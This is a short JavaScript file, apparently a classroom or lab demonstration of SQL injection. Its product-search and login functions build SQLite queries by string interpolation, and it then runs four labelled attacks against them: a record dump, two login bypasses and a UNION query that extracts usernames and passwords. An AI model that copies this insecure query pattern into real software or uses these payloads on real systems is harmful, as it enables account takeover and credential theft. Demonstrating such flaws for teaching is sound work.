// vulnerable.js


const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

function searchProduct(name) {
  const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
  const rows = db.prepare(query).all();
  console.log( rows, '\n');
  return rows;
}

function login(username, password) {
  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  const row = db.prepare(query).get();
  console.log(row,'\n');
  return row;
}


// ATTACK CALLS 
console.log('ATTACK 1 - Dump all products');
searchProduct("' OR 1=1--");

console.log('ATTACK 2 - Login bypass with no password');
login("admin'--", "anything");

console.log('ATTACK 3 - Always true login');
login("' OR '1'='1", "' OR '1'='1");

console.log('ATTACK 4 - UNION attack (steal users via product search)');
searchProduct("' UNION SELECT id, username, password, role FROM users--");